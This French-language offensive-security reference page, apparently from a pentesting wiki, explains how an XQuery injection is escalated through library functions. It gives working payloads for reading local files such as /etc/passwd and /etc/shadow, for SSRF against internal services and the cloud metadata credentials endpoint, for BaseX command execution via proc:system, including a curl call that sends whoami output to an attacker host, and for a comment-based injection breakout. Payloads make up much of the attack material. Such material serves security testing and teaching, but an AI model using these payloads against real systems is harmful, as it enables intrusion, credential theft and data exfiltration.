---
order: 2
title: "Abus de fonctions de bibliothèque XQuery : lecture de fichier, SSRF et exécution de commandes"
description: "Des fonctions intégrées et propriétaires accessibles comme doc(), fn:collection(), fn:unparsed-text() et BaseX proc:system transforment une injection en lecture de fichier, SSRF et RCE."
keywords:
  - abus de fonctions XQuery
  - doc SSRF
  - fn:unparsed-text lecture de fichier
  - BaseX proc:system
  - file:read-text
---

# Abus de fonctions de bibliothèque

Une fois qu'une injection atteint une position d'expression, l'attaquant peut appeler n'importe quelle fonction que le processeur expose, pas seulement réécrire des prédicats. La bibliothèque standard atteint déjà l'extérieur de la base de données, et les modules propriétaires étendent cela à la lecture de fichiers arbitraires et à l'exécution de commandes. Quelles fonctions sont appelables dépend du moteur et de ses permissions configurées, donc l'énumération commence par les fonctions intégrées portables et escalade vers les extensions propriétaires.

## Fonctions standard de document et de texte

`fn:doc()` et `fn:collection()` résolvent une URI et parsent la réponse comme du XML, donc elles lisent des documents XML depuis le disque et atteignent n'importe quelle URI `http://` que le serveur peut atteindre, agissant comme un proxy SSRF pour les points d'accès XML :

```xquery
' or doc('file:///opt/app/config.xml')//text() or '
doc('http://internal-admin.svc.local/users.xml')
```

Parce que `fn:doc()` exige du XML bien formé, les cibles en texte brut et JSON (la plupart des fichiers de configuration Linux, `/etc/hostname` et les réponses de métadonnées cloud) la font avorter avec une erreur de parsing. Pour celles-là, `fn:unparsed-text()` et `fn:unparsed-text-lines()` renvoient les octets bruts sous forme de chaîne et sont la bonne primitive :

```xquery
unparsed-text('file:///etc/passwd')
unparsed-text('file:///etc/hostname')
unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
```

Le point d'accès de métadonnées cloud est une cible fréquente parce que la réponse revient directement via le résultat de la requête. Les deux fonctions acceptent aussi des URI distantes, donnant un canal SSRF et un puits d'exfiltration qui intègre un contenu choisi par l'attaquant dans la sortie. `fn:json-doc()` et `fn:parse-json()` gèrent les points d'accès JSON de façon similaire.

## Modules de fichiers propriétaires

BaseX embarque un module `file` qui lit et liste le système de fichiers directement, contournant entièrement l'exigence de parsing XML :

```xquery
file:read-text('/etc/passwd')
file:list('/home/')
file:read-text('/proc/self/environ')
```

eXist-db expose des utilitaires `util:` et `file:` comparables, et MarkLogic offre `xdmp:document-get()` et `xdmp:filesystem-file()`. Énumérer les modules installés avec `fn:function-lookup()` ou en sondant les préfixes d'espace de noms révèle lesquels de ceux-ci sont accessibles.

## Exécution de commandes

Le module `proc` de BaseX exécute des programmes externes, ce qui convertit l'injection en exécution de commandes complète dans le contexte du compte de service :

```xquery
proc:system('id')
proc:system('bash', ('-c', 'curl http://attacker/$(whoami)'))
proc:execute('/bin/sh', ('-c', 'cat /etc/shadow'))
```

`proc:execute` renvoie stdout, stderr et le code de sortie sous forme de XML, donc la sortie revient directement via le résultat. Les fonctions `xdmp:spawn` et `xdmp:eval` de MarkLogic permettent l'évaluation dynamique de XQuery fourni par l'attaquant, un chemin parallèle vers le même résultat quand le module est activé.

## Enchaîner via l'injection

Délivrés via une rupture FLWOR, ces appels s'insèrent à l'intérieur d'une requête par ailleurs valide :

```
x' return proc:system('id') (: '
```

Le `(:` ouvre un commentaire XQuery qui avale le fragment de fin de la requête d'origine, maintenant l'expression entière parsable pendant que le `proc:system` injecté s'exécute.

## Outils

- **Burp Suite** : livraison de charges utiles d'abus de fonctions et lecture de la sortie renvoyée.
- **Burp Collaborator** : confirmation du SSRF aveugle depuis `doc()` et `unparsed-text()`.
- Tests manuels avec des charges utiles `unparsed-text()`, `file:read-text` et `proc:system`.

## Références

- [W3C XPath/XQuery Functions 3.1: fn:unparsed-text](https://www.w3.org/TR/xpath-functions-31/#func-unparsed-text)
- [BaseX Documentation: Process Module](https://docs.basex.org/wiki/Process_Module)
- [PayloadsAllTheThings: XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
